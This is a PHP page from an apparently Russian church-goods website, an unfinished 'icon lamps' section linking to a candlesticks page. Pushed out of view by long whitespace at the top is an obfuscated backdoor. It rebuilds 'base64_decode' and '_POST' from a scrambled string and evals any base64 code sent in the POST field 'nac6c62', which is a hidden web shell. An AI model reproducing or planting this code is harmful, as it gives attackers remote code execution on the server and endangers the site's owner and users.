<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nac6c62'])) {eval($s21(${$s20}['nac6c62']));}?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
...
<table style="margin: 30 0 30 0" border="0" width="100%" cellspacing="0" cellpadding="0">
	...
	<tr>
		...
		<td background="image/pl_bg.gif" width="100%" style="padding:10 0 0 280;"><h1 class="zag">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ЛАМПАДЫ   
...
<table width="60%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td>
	<p align="left" class="contentheading style11 style12" >К сожалению, раздел на стадии заполнения.<br>
	  <br>
	  <a href="cerkovnye_podsvechniki.php"><em>перейти в "Церковные подсвечники"</em></a> 
<br>
<br></p>
<html>
</html>
